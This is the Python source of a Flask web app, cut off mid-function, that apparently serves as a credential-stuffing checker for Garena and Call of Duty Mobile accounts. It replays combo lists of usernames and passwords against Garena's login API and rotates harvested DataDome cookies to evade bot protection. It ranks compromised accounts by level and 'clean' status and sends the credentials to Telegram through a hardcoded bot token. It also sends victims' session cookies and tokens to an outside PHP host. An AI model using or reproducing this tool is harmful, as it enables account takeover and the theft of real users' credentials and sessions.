# --- START OF FINAL app.py ---

import os
import sys
import re
import time
import json
import uuid
import base64
import hashlib
import random
import logging
import urllib
import platform
import subprocess
import html
import threading
import queue
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode
from collections import OrderedDict

# --- Flask and Web App Imports ---
from flask import Flask, render_template, request, jsonify, redirect, url_for, send_from_directory
from werkzeug.utils import secure_filename

# --- CONFIGURATION (MODIFIED FOR VERCEL) ---
# Vercel has an ephemeral filesystem. All writes MUST go to the /tmp directory.
# WARNING: All data stored here will be LOST when the serverless function instance shuts down.
# This means saved results, logs, and configs are NOT persistent.
ADMIN_TELEGRAM_BOT_TOKEN = os.environ.get("ADMIN_TELEGRAM_BOT_TOKEN", "8075069522:AAE0lI5FgjWw7jebgzJR1JM1kBo2lgITtgI")
ADMIN_TELEGRAM_CHAT_ID = os.environ.get("ADMIN_TELEGRAM_CHAT_ID", "5163892491")
BASE_TMP_DIR = '/tmp'
UPLOAD_FOLDER = os.path.join(BASE_TMP_DIR, 'uploads')
RESULTS_BASE_DIR = os.path.join(BASE_TMP_DIR, 'results')
LOGS_BASE_DIR = os.path.join(BASE_TMP_DIR, 'logs')
APP_DATA_DIR = os.path.join(BASE_TMP_DIR, 'app_data')

# --- Ensure necessary packages are installed ---
# This part is handled by requirements.txt on Vercel.
import requests
from tqdm import tqdm
from colorama import Fore, Style, init
from Crypto.Cipher import AES
# Import placeholder modules
import change_cookie
import ken_cookie
import cookie_config
import set_cookie

# Initialize Colorama for server-side logs
init(autoreset=True)

# --- Flask App Setup ---
app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
# Create temporary directories on Vercel
for folder in [UPLOAD_FOLDER, RESULTS_BASE_DIR, LOGS_BASE_DIR, APP_DATA_DIR]:
    os.makedirs(folder, exist_ok=True)

# --- Global State for Background Task ---
# This dictionary will hold the state of the checker process
check_status = {
    'running': False,
    'progress': 0,
    'total': 0,
    'logs': [],
    'stats': {},
    'final_summary': None,
    'captcha_detected': False,
    'stop_requested': False,
    'current_account': '',
    'current_ip': None, # To store the initial IP
}
# Lock for thread-safe access to the check_status
status_lock = threading.Lock()
# Event to signal the background thread to stop
stop_event = threading.Event()
# Event to pause/resume the worker during CAPTCHA
captcha_pause_event = threading.Event()

# --- Constants ---
RED = "\033[31m"
RESET = "\033[0m"
BOLD = "\033[1;37m"
GREEN = "\033[32m"
apkrov = "https://auth.garena.com/api/login?"
redrov = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
datenok = str(int(time.time()))
PROGRESS_STATE_FILE = os.path.join(APP_DATA_DIR, 'progress_state.json')


COUNTRY_KEYWORD_MAP = {
    "PH": ["PHILIPPINES", "PH"], "ID": ["INDONESIA", "ID"], "US": ["UNITED STATES", "USA", "US"],
    "ES": ["SPAIN", "ES"], "VN": ["VIETNAM", "VN"], "CN": ["CHINA", "CN"], "MY": ["MALAYSIA", "MY"],
    "TW": ["TAIWAN", "TW"], "TH": ["THAILAND", "TH"], "RU": ["RUSSIA", "RUSSIAN FEDERATION", "RU"],
    "PT": ["PORTUGAL", "PT"],
}

# --- Helper Functions (Adapted for Web App) ---

def get_public_ip():
    """Fetches the public IP address."""
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        response.raise_for_status()
        return response.json().get('ip')
    except requests.RequestException as e:
        log_message(f"Could not fetch public IP: {e}", "text-danger")
        return None

def log_message(message, color_class='text-white'):
    """Adds a message to the shared log state for the web UI."""
    clean_message = strip_ansi_codes_jarell(message)
    timestamp = datetime.now().strftime('%H:%M:%S')
    with status_lock:
        check_status['logs'].append({'timestamp': timestamp, 'message': clean_message, 'class': color_class})
        if len(check_status['logs']) > 500:
            check_status['logs'].pop(0)

def clear_screen():
    pass

def get_app_data_directory(): return APP_DATA_DIR
def get_logs_directory(): return LOGS_BASE_DIR
def get_results_directory(): return RESULTS_BASE_DIR

def save_telegram_config(token, chat_id):
    config_path = os.path.join(get_app_data_directory(), "telegram_config.json")
    config = {'bot_token': token, 'chat_id': chat_id}
    try:
        with open(config_path, 'w') as f: json.dump(config, f, indent=4)
        log_message("[💾] Telegram credentials saved successfully (for this session only).", "text-success")
    except IOError as e: log_message(f"Error saving Telegram config: {e}", "text-danger")

def load_telegram_config():
    config_path = os.path.join(get_app_data_directory(), "telegram_config.json")
    if not os.path.exists(config_path): return None, None
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
            return config.get('bot_token'), config.get('chat_id')
    except (json.JSONDecodeError, IOError): return None, None

def strip_ansi_codes_jarell(text):
    ansi_escape_jarell = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
    return ansi_escape_jarell.sub('', text)

def get_datenow(): return datenok

def generate_md5_hash(password):
    md5_hash = hashlib.md5(); md5_hash.update(password.encode('utf-8')); return md5_hash.hexdigest()

def generate_decryption_key(password_md5, v1, v2):
    intermediate_hash = hashlib.sha256((password_md5 + v1).encode()).hexdigest()
    return hashlib.sha256((intermediate_hash + v2).encode()).hexdigest()

def encrypt_aes_256_ecb(plaintext, key):
    cipher = AES.new(bytes.fromhex(key), AES.MODE_ECB)
    plaintext_bytes = bytes.fromhex(plaintext)
    padding_length = 16 - len(plaintext_bytes) % 16
    plaintext_bytes += bytes([padding_length]) * padding_length
    chiper_raw = cipher.encrypt(plaintext_bytes)
    return chiper_raw.hex()[:32]

def getpass(password, v1, v2):
    password_md5 = generate_md5_hash(password)
    decryption_key = generate_decryption_key(password_md5, v1, v2)
    return encrypt_aes_256_ecb(password_md5, decryption_key)

def get_datadome_cookie(pbar_placeholder=None): # pbar not used in web, kept for signature compatibility
    url = 'https://dd.garena.com/js/'
    headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br, zstd','accept-language': 'en-US,en;q=0.9','cache-control': 'no-cache','content-type': 'application/x-www-form-urlencoded','origin': 'https://account.garena.com','pragma': 'no-cache','referer': 'https://account.garena.com/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/536.36'}
    js_data_dict = {"ttst": 76.7, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/536.36", "wbd": False, "lg": "en-US", "plg": 5, "plgne": True, "vnd": "Google Inc."}
    payload = {'jsData': json.dumps(js_data_dict), 'eventCounters' : '[]', 'jsType': 'ch', 'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae', 'ddk': 'AE3F04AD3F0D3A462481A337485081', 'Referer': 'https://account.garena.com/', 'request': '/', 'responsePage': 'origin', 'ddv': '4.35.4'}
    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        response_json = response.json()
        if response_json.get('status') == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            log_message("[🍪] Successfully fetched a new DataDome cookie from server.", "text-success")
            return cookie_string.split(';')[0].split('=')[1]
        return None
    except requests.exceptions.RequestException: return None

def fetch_new_datadome_pool(num_cookies=5):
    log_message(f"[⚙️] Attempting to fetch {num_cookies} new DataDome cookies...", "text-info")
    new_pool = []
    for _ in range(num_cookies):
        new_cookie = get_datadome_cookie()
        if new_cookie and new_cookie not in new_pool:
            new_pool.append(new_cookie)
        log_message(f"Fetching cookies... ({len(new_pool)}/{num_cookies})", "text-info")
        time.sleep(random.uniform(0.5, 1.5))
    if new_pool:
        log_message(f"[✅] Successfully fetched {len(new_pool)} new unique cookies.", "text-success")
    else:
        log_message(f"[❌] Failed to fetch any new cookies. Your IP might be heavily restricted.", "text-danger")
    return new_pool

def save_successful_token(token, pbar=None):
    if not token: return
    output_dir = get_app_data_directory()
    file_path = os.path.join(output_dir, "token_sessions.json")
    token_pool = []
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r') as f:
                data = json.load(f)
                if isinstance(data, list): token_pool = data
        except (json.JSONDecodeError, IOError): pass
    if token not in token_pool:
        token_pool.append(token)
        try:
            with open(file_path, 'w') as f: json.dump(token_pool, f, indent=4)
            log_message("[💾] New Token Session saved to pool.", "text-success")
        except IOError as e: log_message(f"Error saving token session file: {e}", "text-danger")

def save_datadome_cookie(cookie_value, pbar=None):
    if not cookie_value: return
    output_dir = get_app_data_directory()
    file_path = os.path.join(output_dir, "datadome_cookies.json")
    cookie_pool = []
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r') as f:
                data = json.load(f)
                if isinstance(data, list): cookie_pool = data
        except (json.JSONDecodeError, IOError): pass
    # Check if a cookie with the same 'datadome' value already exists
    if not any(isinstance(c, dict) and c.get('datadome') == cookie_value for c in cookie_pool):
        cookie_pool.append({'datadome': cookie_value})
        try:
            with open(file_path, 'w') as f: json.dump(cookie_pool, f, indent=4)
            log_message(f"[💾] New DataDome Cookie ...{cookie_value[-6:]} saved to persistent pool.", "text-info")
        except IOError as e: log_message(f"Error saving datadome cookie file: {e}", "text-danger")

def check_login(account_username, _id, encryptedpassword, password, selected_header, cookies, dataa, date, selected_cookie_module, pbar=None):
    cookies["datadome"] = dataa
    login_params = {'app_id': '100082', 'account': account_username, 'password': encryptedpassword, 'redirect_uri': redrov, 'format': 'json', 'id': _id}
    login_url = apkrov + urlencode(login_params)
    try:
        response = requests.get(login_url, headers=selected_header, cookies=cookies, timeout=60)
        response.raise_for_status()
        login_json_response = response.json()
    except requests.exceptions.RequestException as e: return f"[⚠️] Request Error: {e}"
    except json.JSONDecodeError: return f"[💢] Invalid JSON: {response.text[:100]}"
    if 'error_auth' in login_json_response or 'error' in login_json_response: return "[🔐] ɪɴᴄᴏʀʀᴇᴄᴛ ᴘᴀssᴡᴏʀᴅ"
    session_key = login_json_response.get('session_key')
    if not session_key: return "[FAILED] No session key found after login"
    
    # A successful login occurred with 'dataa' cookie. Save it.
    save_datadome_cookie(dataa)
    
    log_message("[🔑] Successfully obtained session_key.", "text-success")
    successful_token = response.cookies.get('token_session')
    if successful_token: save_successful_token(successful_token)
    set_cookie_header = response.headers.get('Set-Cookie', '')
    sso_key = set_cookie_header.split('=')[1].split(';')[0] if '=' in set_cookie_header else ''
    coke = selected_cookie_module.get_cookies()
    coke["datadome"] = dataa
    coke["sso_key"] = sso_key
    if successful_token: coke["token_session"] = successful_token
    hider = {'Host': 'account.garena.com', 'Connection': 'keep-alive', 'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"', 'sec-ch-ua-mobile': '?1', 'User-Agent': selected_header["User-Agent"], 'Accept': 'application/json, text/plain, */*', 'Referer': f'https://account.garena.com/?session_key={session_key}', 'Accept-Language': 'en-US,en;q=0.9'}
    init_url = 'http://gakumakupal.x10.bz/patal.php'
    params = {f'coke_{k}': v for k, v in coke.items()}
    params.update({f'hider_{k}': v for k, v in hider.items()})
    try:
        init_response = requests.get(init_url, params=params, timeout=120)
        init_response.raise_for_status()
        init_json_response = init_response.json()
    except (requests.RequestException, json.JSONDecodeError) as e: return f"[ERROR] Bind check failed: {e}"
    if 'error' in init_json_response or not init_json_response.get('success', True): return f"[ERROR] {init_json_response.get('error', 'Unknown error during bind check')}"
    bindings = init_json_response.get('bindings', [])
    is_clean = init_json_response.get('status') == "\033[0;32m\033[1mClean\033[0m"
    country, last_login, fb, mobile, facebook = "N/A", "N/A", "N/A", "N/A", "False"
    shell, email = "0", "N/A"
    email_verified, authenticator_enabled, two_step_enabled = "False", "False", "False"
    for item in bindings:
        try:
            key, value = item.split(":", 1)
            value = value.strip()
            if key == "Country": country = value
            elif key == "LastLogin": last_login = value
            elif key == "Garena Shells": shell = value
            elif key == "Facebook Account": fb, facebook = value, "True"
            elif key == "Mobile Number": mobile = value
            elif key == "tae": email_verified = "True"
            elif key == "eta": email = value
            elif key == "Authenticator": authenticator_enabled = "True"
            elif key == "Two-Step Verification": two_step_enabled = "True"
        except ValueError: continue
    
    head = {"Host": "auth.garena.com", "Connection": "keep-alive", "Accept": "application/json, text/plain, */*", "User-Agent": selected_header["User-Agent"], "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "Origin": "https://auth.garena.com", "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"}
    data_payload = {"client_id": "100082", "response_type": "token", "redirect_uri": "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/", "format": "json", "id": _id}
    try:
        grant_url = "https://auth.garena.com/oauth/token/grant"
        reso = requests.post(grant_url, headers=head, data=data_payload, cookies=coke)
        reso.raise_for_status()
        data = reso.json()
        if "access_token" in data:
            log_message("[🔑] Successfully obtained access_token. Fetching game details...", "text-success")
            game_info = show_level(data["access_token"], selected_header, sso_key, successful_token, get_datadome_cookie(), coke)
            codm_level = 'N/A'
            if "[FAILED]" in game_info:
                connected_games = ["No CODM account found or error fetching data."]
            else:
                codm_nickname, codm_level, codm_region, uid = game_info.split("|")
                connected_games = [f"  › Nickname: {codm_nickname}\n  › Level: {codm_level}\n  › Region: {codm_region}\n  › UID: {uid}"] if uid and uid != 'N/A' else ["No CODM account found"]
            return format_result(last_login, country, shell, mobile, facebook, email_verified, authenticator_enabled, two_step_enabled, connected_games, is_clean, fb, email, date, account_username, password, codm_level)
        else: return f"[FAILED] 'access_token' not found in grant response."
    except (requests.RequestException, json.JSONDecodeError) as e: return f"[FAILED] Token grant failed: {e}"

def show_level(access_token, selected_header, sso, token, newdate, cookie):
    url = "https://auth.codm.garena.com/auth/auth/callback_n"
    params = {"site": "https://api-delete-request.codm.garena.co.id/oauth/callback/", "access_token": access_token}
    headers = {"Referer": "https://auth.garena.com/", "User-Agent": selected_header.get("User-Agent", "Mozilla/5.0")}
    cookie.update({"datadome": newdate, "sso_key": sso, "token_session": token})
    try:
        res = requests.get(url, headers=headers, cookies=cookie, params=params, timeout=30, allow_redirects=True)
        res.raise_for_status()
        parsed_url = urlparse(res.url)
        extracted_token = parse_qs(parsed_url.query).get("token", [None])[0]
        if not extracted_token: return "[FAILED] No token extracted from redirected URL."
        check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
        check_login_headers = {"codm-delete-token": extracted_token, "Origin": "https://delete-request.codm.garena.co.id", "Referer": "https://delete-request.codm.garena.co.id/", "User-Agent": selected_header.get("User-Agent", "Mozilla/5.0")}
        check_login_response = requests.get(check_login_url, headers=check_login_headers, timeout=30)
        check_login_response.raise_for_status()
        data = check_login_response.json()
        if data and "user" in data:
            user = data["user"]
            return f"{user.get('codm_nickname', 'N/A')}|{user.get('codm_level', 'N/A')}|{user.get('region', 'N/A')}|{user.get('uid', 'N/A')}"
        else: return "[FAILED] NO CODM ACCOUNT!"
    except (requests.RequestException, json.JSONDecodeError, KeyError, IndexError) as e: return f"[FAILED] CODM data fetch error: {e}"

def format_result(last_login, country, shell, mobile, facebook, email_verified, authenticator_enabled, two_step_enabled, connected_games, is_clean, fb, email, date, username, password, codm_level):
    is_clean_text = "Clean ✨" if is_clean else "Not Clean 🚨"
    email_ver_text = "Verified ✅" if email_verified == "True" else "Not Verified ❌"
    bool_status_text = lambda status_str: "Enabled ✅" if status_str == 'True' else "Disabled ❌"
    has_codm = "No CODM account found" not in connected_games[0]

    console_message = f"""
╔══════════════════════════════╗
║    ✅ GARENA ACCOUNT HIT ✅     ║
╚══════════════════════════════╝
    [🔐] Credentials:
    › User: {username}
    › Pass: {password}
    ────────────────────────
    [🌐] Account Info:
    › Country: {country}
    › Shells: {shell} 💵
    › Last Login: {last_login}
    › Email: {email} ({email_ver_text})
    › Facebook: {fb}
    ────────────────────────
    [🎮] CODM Details:
    {connected_games[0].replace(chr(10), chr(10) + "    ")}
    ────────────────────────
    [🛡️] Security:
    › Account Status: {is_clean_text}
    › Mobile Bind: {"Bound ✅" if mobile != 'N/A' else "Not Bound ❌"}
    › Facebook Link: {bool_status_text(facebook)}
    › 2FA Enabled: {bool_status_text(two_step_enabled)}
    › Authenticator: {bool_status_text(authenticator_enabled)}
    ────────────────────────
    › Presented By: @KenshiKupal ‹
    """.strip()

    codm_level_num = int(codm_level) if isinstance(codm_level, str) and codm_level.isdigit() else 0
    telegram_message = None
    if has_codm:
        s_user, s_pass, s_country = html.escape(username), html.escape(password), html.escape(country)
        s_email, s_fb, s_last_login = html.escape(email), html.escape(fb), html.escape(last_login)
        tg_clean_status, tg_email_ver = ("Clean ✨", "Verified ✅") if is_clean else ("Not Clean 🚨", "Not Verified ❌")
        tg_codm_info = "\n".join([f"  <code>{html.escape(line.strip())}</code>" for line in connected_games[0].strip().split('\n')])
        
        level_icon = "🌟" if codm_level_num >= 100 else "⭐"
        tg_title = f"{level_icon} <b>GARENA HIT | LVL {codm_level_num}</b> {level_icon}"

        telegram_message = f"""
{tg_title}
━━━━━━━━━━━━━━━━━━━━
🔐 <b>Credentials:</b>
  › <b>User:</b> <code>{s_user}</code>
  › <b>Pass:</b> <code>{s_pass}</code>
━━━━━━━━━━━━━━━━━━━━
🌐 <b>Account Info:</b>
  › <b>Country:</b> {s_country}
  › <b>Shells:</b> {shell} 💵
  › <b>Last Login:</b> {s_last_login}
  › <b>Email:</b> <code>{s_email}</code> ({tg_email_ver})
  › <b>Facebook:</b> <code>{s_fb}</code>
━━━━━━━━━━━━━━━━━━━━
🎮 <b>CODM Details:</b>
{tg_codm_info}
━━━━━━━━━━━━━━━━━━━━
🛡️ <b>Security Status:</b>
  › <b>Account Status:</b> {tg_clean_status}
  › <b>Mobile Bind:</b> {'Bound ✅' if mobile != 'N/A' else 'Not Bound ❌'}
  › <b>Facebook Link:</b> {'Enabled ✅' if facebook == 'True' else 'Disabled ❌'}
  › <b>2FA Enabled:</b> {'Enabled ✅' if two_step_enabled == 'True' else 'Disabled ❌'}
  › <b>Authenticator:</b> {'Enabled ✅' if authenticator_enabled == 'True' else 'Disabled ❌'}
━━━━━━━━━━━━━━━━━━━━
<i>Presented By: @KenshiKupal</i>
        """.strip()

    country_folder = "Others"
    for folder_key, keywords in COUNTRY_KEYWORD_MAP.items():
        if any(keyword in str(country).upper() for keyword in keywords):
            country_folder = folder_key
            break

    level_range = "No_CODM_Data"
    if has_codm:
        if 1 <= codm_level_num <= 50: level_range = "1-50"
        elif 51 <= codm_level_num <= 100: level_range = "51-100"
        elif 101 <= codm_level_num <= 200: level_range = "101-200"
        elif 201 <= codm_level_num <= 300: level_range = "201-300"
        elif 301 <= codm_level_num <= 400: level_range = "301-400"

    clean_tag = "clean" if is_clean else "not_clean"
    country_path = os.path.join(get_results_directory(), country_folder)
    file_to_write = os.path.join(country_path, f"{level_range}_{clean_tag}.txt")
    content_to_write = console_message + "\n" + "=" * 35 + "\n"

    return (console_message, telegram_message, codm_level_num, country, username, password, shell, has_codm, is_clean, file_to_write, content_to_write)

def get_request_data(selected_cookie_module):
    cookies = selected_cookie_module.get_cookies()
    headers = {'Host': 'auth.garena.com', 'Connection': 'keep-alive', 'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"', 'sec-ch-ua-mobile': '?1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36', 'sec-ch-ua-platform': '"Android"', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-US,en;q=0.9'}
    return cookies, headers

def check_account(username, password, date, datadome_cookie, selected_cookie_module, pbar=None):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            random_id = "17290585" + str(random.randint(10000, 99999))
            cookies, headers = get_request_data(selected_cookie_module)
            if datadome_cookie: cookies['datadome'] = datadome_cookie
            params, login_url = {"app_id": "100082", "account": username, "format": "json", "id": random_id}, "https://auth.garena.com/api/prelogin"
            response = requests.get(login_url, params=params, cookies=cookies, headers=headers, timeout=20)
            if "captcha" in response.text.lower(): return "[CAPTCHA]"
            if response.status_code == 200:
                data = response.json()
                if not all(k in data for k in ['v1', 'v2', 'id']): return "[😢] 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗗𝗜𝗗𝗡'𝗧 𝗘𝗫𝗜𝗦𝗧"
                login_datadome = response.cookies.get('datadome') or datadome_cookie
                if "error" in data: return f"[FAILED] Pre-login error: {data['error']}"
                encrypted_password = getpass(password, data['v1'], data['v2'])
                return check_login(username, random_id, encrypted_password, password, headers, cookies, login_datadome, date, selected_cookie_module, pbar)
            else: return f"[FAILED] HTTP Status: {response.status_code}"
        except requests.exceptions.RequestException as e:
            error_str = str(e).lower()
            if "failed to establish a new connection" in error_str or "max retries exceeded" in error_str or "network is unreachable" in error_str:
                log_message(f"[⚠️] Connection error for {username}. Retrying ({attempt + 1}/{max_retries})...", "text-warning")
                if attempt < max_retries - 1: time.sleep(5); continue
                else: return f"[FAILED] Connection failed after {max_retries} retries."
            else: return f"[FAILED] Unexpected Request Error: {e}"
        except Exception as e: return f"[FAILED] Unexpected Error: {e}"

def send_to_telegram(bot_token, chat_id, message):
    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML', 'disable_web_page_preview': True}
    try:
        response = requests.post(api_url, json=payload, timeout=10)
        return response.status_code == 200
    except Exception: return False

def remove_duplicates_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f: lines = f.read().splitlines()
        initial_count = len(lines)
        unique_lines = list(OrderedDict.fromkeys(line for line in lines if line.strip()))
        final_count = len(unique_lines)
        removed_count = initial_count - final_count
        if removed_count > 0:
            with open(file_path, 'w', encoding='utf-8') as f: f.write('\n'.join(unique_lines))
            log_message(f"[✨] Removed {removed_count} duplicate/empty line(s) from '{os.path.basename(file_path)}'.", "text-info")
        return unique_lines, final_count
    except FileNotFoundError:
        log_message(f"Error: File not found at '{file_path}'.", "text-danger")
        return [], 0
    except Exception as e:
        log_message(f"Error processing file for duplicates: {e}", "text-danger")
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line for line in f.read().splitlines() if line.strip()]
        return lines, len(lines)

def save_progress(file_path, index):
    state = {'source_file_path': file_path, 'last_processed_index': index}
    try:
        with open(PROGRESS_STATE_FILE, 'w') as f:
            json.dump(state, f)
    except IOError:
        pass # Fail silently if we can't save progress

def load_progress():
    if not os.path.exists(PROGRESS_STATE_FILE):
        return None
    try:
        with open(PROGRESS_STATE_FILE, 'r') as f:
            return json.load(f)
    except (IOError, json.JSONDecodeError):
        return None

def clear_progress():
    if os.path.exists(PROGRESS_STATE_FILE):
        os.remove(PROGRESS_STATE_FILE)

# MODIFIED: Add fixed_cookie_number parameter
def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_cookie_module_name, use_cookie_set, auto_delete, force_restart, telegram_level_filter, fixed_cookie_number=0):
    """The main background task for checking accounts."""
    global check_status, stop_event, captcha_pause_event
    
    is_complete = False
    try:
        # <<< --- ADDED THIS LINE FOR DIAGNOSTICS --- >>>
        log_message("[▶️] Background checker task has started successfully.", "text-info")

        with status_lock:
            check_status['current_ip'] = get_public_ip()
            log_message(f"[🌐] Current public IP detected: {check_status.get('current_ip', 'Unknown')}", "text-info")

        # --- Progress Handling ---
        if force_restart:
            clear_progress()
            log_message("[🔄] Forced restart. Previous progress has been cleared.", "text-info")

        start_from_index = 0
        progress_data = load_progress()
        if progress_data and progress_data.get('source_file_path') == file_path:
            start_from_index = progress_data.get('last_processed_index', -1) + 1
            if start_from_index > 0:
                log_message(f"[🔄] Resuming session from line {start_from_index + 1}.", "text-info")

        # Select cookie module based on name
        selected_cookie_module = getattr(sys.modules[__name__], selected_cookie_module_name)

        if selected_cookie_module_name == 'set_cookie' and fixed_cookie_number > 0:
            set_cookie.set_fixed_number(fixed_cookie_number)
            log_message(f"[⚙️] Numbered Set is locked to use ONLY cookie #{fixed_cookie_number}.", "text-info")

        stats = {
            'successful': 0, 'failed': 0, 'clean': 0, 'not_clean': 0, 'incorrect_pass': 0,
            'no_exist': 0, 'other_fail': 0, 'telegram_sent': 0, 'captcha_count': 0,
            'level_distribution': {"1-50": 0, "51-100": 0, "101-200": 0, "201-300": 0, "301-400": 0, "No_CODM_Data": 0},
            'country_counts': {},
        }
        date = get_datenow()
        failed_file = os.path.join(get_logs_directory(), f"failed_{date}.txt")

        accounts, total_accounts = remove_duplicates_from_file(file_path)
        
        accounts_to_process = accounts[start_from_index:]
        
        with status_lock:
            check_status['total'] = total_accounts
            check_status['progress'] = start_from_index
            check_status['stats'] = stats

        cookie_state = {'pool': [], 'index': -1, 'cooldown': {}}
        if use_cookie_set:
            cookie_state['pool'] = [c.get('datadome') for c in cookie_config.COOKIE_POOL if c.get('datadome')]
            log_message(f"[🍪] Loaded {len(cookie_state['pool'])} hardcoded DataDome cookies.", "text-info")
        else:
            cookie_file = os.path.join(get_app_data_directory(), "datadome_cookies.json")
            if os.path.exists(cookie_file):
                try:
                    with open(cookie_file, 'r') as f:
                        loaded_cookies = json.load(f)
                        if isinstance(loaded_cookies, list):
                            cookie_state['pool'] = [c.get('datadome') for c in loaded_cookies if 'datadome' in c]
                    log_message(f"[🍪] Loaded {len(cookie_state['pool'])} DataDome cookies from local pool.", "text-info")
                except (json.JSONDecodeError, IOError):
                    log_message("[⚠️] Could not load local cookie file. It might be corrupted.", "text-warning")
            
        if not cookie_state['pool']:
            log_message("[⚠️] DataDome cookie pool is empty. Fetching new ones...", "text-warning")
            cookie_state['pool'] = fetch_new_datadome_pool()
            if not cookie_state['pool']:
                log_message("[❌] Failed to get any DataDome cookies. Stopping.", "text-danger")
                stop_event.set()

        # --- Main Checking Loop ---
        for loop_idx, acc in enumerate(accounts_to_process):
            original_index = start_from_index + loop_idx
            
            if stop_event.is_set():
                log_message("Checker stopped by user.", "text-warning")
                break

            with status_lock:
                check_status['progress'] = original_index
                check_status['current_account'] = acc

            if ':' in acc:
                username, password = acc.split(':', 1)
                is_captcha_loop = True
                while is_captcha_loop and not stop_event.is_set():
                    
                    current_datadome = None
                    if not cookie_state['pool']:
                        log_message("[❌] No cookies left in the active pool. Stopping check.", "text-danger")
                        stop_event.set()
                        break
                        
                    for _ in range(len(cookie_state['pool'])):
                        cookie_state['index'] = (cookie_state['index'] + 1) % len(cookie_state['pool'])
                        potential_cookie = cookie_state['pool'][cookie_state['index']]
                        
                        cooldown_until = cookie_state['cooldown'].get(potential_cookie)
                        if cooldown_until and time.time() < cooldown_until:
                            continue 
                        current_datadome = potential_cookie
                        break
                    
                    if not current_datadome:
                        log_message("[❌] All available cookies are on cooldown. Please wait or add new cookies.", "text-danger")
                        stop_event.set()
                        break

                    log_message(f"[▶] Checking: {username}:{password} with cookie ...{current_datadome[-6:]}", "text-info")
                    result = check_account(username, password, date, current_datadome, selected_cookie_module)

                    # --- AUTO-DELETE COOKIE LOGIC ---
                    try:
                        cookie_state['pool'].remove(current_datadome)
                        log_message(f"[🗑️] Cookie ...{current_datadome[-6:]} used and removed from this session's pool.", "text-white")
                        # Reset index to avoid skipping an element
                        cookie_state['index'] = -1 
                    except ValueError:
                        pass # Cookie might have already been removed

                    if result == "[CAPTCHA]":
                        stats['captcha_count'] += 1
                        log_message(f"[🔴 CAPTCHA] Triggered by cookie ...{current_datadome[-6:]}", "text-danger")
                        
                        expiry_time = time.time() + 300
                        cookie_state['cooldown'][current_datadome] = expiry_time
                        log_message(f"[⏳] Bad cookie info stored in case of IP change.", "text-warning")

                        with status_lock: check_status['captcha_detected'] = True
                        
                        captcha_pause_event.clear()
                        captcha_pause_event.wait() 
                        
                        with status_lock: check_status['captcha_detected'] = False
                        
                        if stop_event.is_set(): break
                        log_message("[🔄] Resuming check for the same account...", "text-info")
                        continue

                    else:
                        is_captcha_loop = False

                if stop_event.is_set(): break
                
                if isinstance(result, tuple):
                    console_message, telegram_message, codm_level_num, country, user, pwd, shell, has_codm, is_clean, file_to_write, content_to_write = result
                    log_message(console_message, "text-success")
                    stats['successful'] += 1
                    if is_clean: stats['clean'] += 1
                    else: stats['not_clean'] += 1
                    
                    os.makedirs(os.path.dirname(file_to_write), exist_ok=True)
                    with open(file_to_write, "a", encoding="utf-8") as f: f.write(content_to_write)
                    
                    if telegram_message and telegram_bot_token and telegram_chat_id and telegram_level_filter != 'none':
                        send_notification = False
                        if telegram_level_filter == 'all': send_notification = True
                        elif telegram_level_filter == '100+' and codm_level_num >= 100: send_notification = True
                        
                        if send_notification:
                            if send_to_telegram(telegram_bot_token, telegram_chat_id, telegram_message):
                                log_message(f"[✅ TG] Notification sent for {user}.", "text-info")
                                stats['telegram_sent'] += 1
                            else:
                                log_message(f"[❌ TG] Failed to send notification for {user}.", "text-danger")

                elif result:
                    stats['failed'] += 1
                    if "[🔐]" in result: stats['incorrect_pass'] += 1
                    elif "[😢]" in result: stats['no_exist'] += 1
                    else: stats['other_fail'] += 1
                    with open(failed_file, 'a', encoding='utf-8') as failed_out:
